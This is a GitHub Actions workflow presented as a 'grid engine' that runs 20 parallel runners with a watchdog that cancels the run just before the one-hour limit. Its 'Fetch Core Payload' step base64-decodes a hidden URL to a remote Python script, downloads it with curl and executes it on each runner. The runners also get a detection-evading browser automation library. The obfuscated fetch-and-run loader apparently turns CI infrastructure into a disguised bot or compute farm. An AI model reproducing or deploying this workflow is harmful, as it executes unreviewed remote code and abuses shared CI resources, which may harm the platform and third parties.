name: Horizon Pulsar Grid Engine

on:
  workflow_dispatch:

concurrency:
  group: pulsar-engine-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Watchdog: waits 59 minutes then terminates the entire workflow run
  # =================================================================
  horizon-watchdog:
    name: "Horizon Watchdog"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      WATCH_DELAY: 3540
    steps:
      - name: Activate Watchdog
        run: |
          echo "[WATCHDOG] Watchdog activated for build ID: ${{ github.run_id }}"
          echo "[WATCHDOG] Holding vigil for ${WATCH_DELAY} seconds (59-minute threshold)."

          sleep "${WATCH_DELAY}"

          echo "[WATCHDOG] Threshold breached — dispatching termination signal."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[WATCHDOG] Termination signal dispatched. All active and pending tasks will be aborted."

  # =================================================================
  # Pulsar Grid: concurrent execution of worker nodes
  # =================================================================
  pulsar-grid:
    name: "PulsarNode-${{ matrix.node_code }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_code: [X9-A1, X9-A2, X9-A3, X9-A4, X9-B1, X9-B2, X9-B3, X9-B4, X9-C1, X9-C2, X9-C3, X9-C4, X9-D1, X9-D2, X9-D3, X9-D4, X9-E1, X9-E2, X9-E3, X9-E4]

    steps:
      # #################################################################
      # Stage 1: Setup environment
      # #################################################################
      - name: Setup Environment
        run: |
          echo "[SETUP] Initializing PulsarNode-${{ matrix.node_code }} workspace..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # #################################################################
      # Stage 2: Fetch core runtime payload
      # #################################################################
      - name: Fetch Core Payload
        run: |
          echo "[FETCH] Downloading core payload from remote repository..."
          PAYLOAD_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$PAYLOAD_URL" -o core_worker.py
          echo "[FETCH] Core payload retrieved successfully."

      # #################################################################
      # Stage 3: Install dependency modules
      # #################################################################
      - name: Install Dependency Modules
        run: |
          echo "[MODULES] Installing required python libraries..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # #################################################################
      # Stage 4: Execute core worker (59-minute boundary)
      # #################################################################
      - name: Execute Core Worker
        run: |
          echo ">> Starting PulsarNode-${{ matrix.node_code }} background worker..."

          python3 core_worker.py &
          WORKER_PID=$!

          echo ">> Worker active. Maximum allowed duration: 59 minutes (3540s)."

          sleep 3540

          if kill -0 "$WORKER_PID" 2>/dev/null; then
            echo ">> Maximum duration reached — stopping worker process."
            kill -9 "$WORKER_PID"
            echo ">> Worker successfully terminated by controller."
          else
            echo ">> Worker finished execution prior to time limit."
          fi
